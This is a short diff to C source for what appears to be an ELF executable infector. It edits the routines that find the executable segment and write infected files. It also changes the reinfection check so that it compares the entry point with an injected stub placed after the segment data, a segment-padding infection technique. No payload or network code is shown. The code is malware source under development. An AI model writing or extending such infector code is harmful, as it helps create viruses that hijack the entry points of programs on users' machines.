@@ -21,7 +21,6 @@ Elf64_Phdr *find_exec_segment(void *map, size_t mapsize)
         if (ph[i].p_type == PT_LOAD && (ph[i].p_flags & PF_X))
             return &ph[i];
     }
-
     return NULL;
 }
 
@@ -144,13 +143,16 @@ int write_infected_file(const char *output_path, void *map, size_t size)
 int already_infected(void *map, ElfInfo *info)
 {
     Elf64_Ehdr *eh;
+    uint64_t stub_entry;
 
-    if(!map || !info)
+    if (!map || !info)
         return (0);
-    
-    eh = (Elf64_Ehdr *)map;
 
-    if(eh->e_entry >= info->seg_vaddr && eh->e_entry < info->seg_vaddr + info->seg_memsz)
+    eh = (Elf64_Ehdr *)map;
+    stub_entry = info->seg_vaddr + info->seg_filesz;
+
+    if (eh->e_entry == stub_entry)
         return (1);
+
     return (0);
 }
